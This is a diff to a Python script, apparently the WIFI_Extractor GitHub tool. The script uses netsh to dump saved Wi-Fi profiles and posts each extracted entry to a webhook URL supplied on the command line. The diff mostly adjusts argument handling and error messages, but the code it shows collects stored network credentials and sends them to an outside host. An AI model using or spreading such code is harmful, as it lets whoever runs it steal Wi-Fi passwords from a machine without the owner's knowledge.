@@ -2,9 +2,8 @@
     GitHub repository: https://github.com/hrdax/WIFI_Extractor
     '''
 
-import os, requests, subprocess, click
+import os, requests, subprocess, click, sys
 import xml.etree.ElementTree as t
-
 #lista de exportaciones xml que genera el netsh y Wifis
 Archivos_XML_WIFI = []
 WIFIs = []
@@ -19,22 +18,26 @@ WIFIs = []
 def main(url, only_webhook, version):
     if version == True:
         print('\nWIFI Extractor\n\nVersion 1.0\n')
-        exit()
+        sys.exit()
     elif url != '' and only_webhook == True:
-        extractor(only_webhook)
+        extractor(url, only_webhook)
         urlweb(url)
-        
     elif url != '' and only_webhook == False:
-        extractor(only_webhook)
+        if url == '-o':
+            only_webhook = True
+        extractor(url, only_webhook)
         urlweb(url)
+    elif only_webhook == True:
+        print('\n***Error: Use -u to specify the url while using -o | Para usar -o debe especificar la URL con -u***\n')
+        sys.exit()
     else:
-        extractor(only_webhook)
+        extractor(url,only_webhook)
         print('\nDone! \n\nHecho!\n')
 
 #hara el proceso de extraccion
-def extractor(only_webhook):
+def extractor(url, only_webhook):
     #crea el archivo txt
-    if only_webhook == False:
+    if url != '' and only_webhook == False:
         txt = open("Extracciones.txt", "w")
 
     #corre el comando en la command prompt
@@ -84,8 +87,9 @@ def urlweb(url):
             requests.post(urlpost, data=i)
         print('\nDone! \n\nHecho!\n')
     except:
-        print('\nError could not send: url not specified or invalid url | url no especificada o es invalida\n')
-        exit()
+        print('\n***Error could not send: url not specified or invalid url | url no especificada o es invalida***\n')
+        sys.exit()
+        
 
 if __name__ == '__main__':
     main()
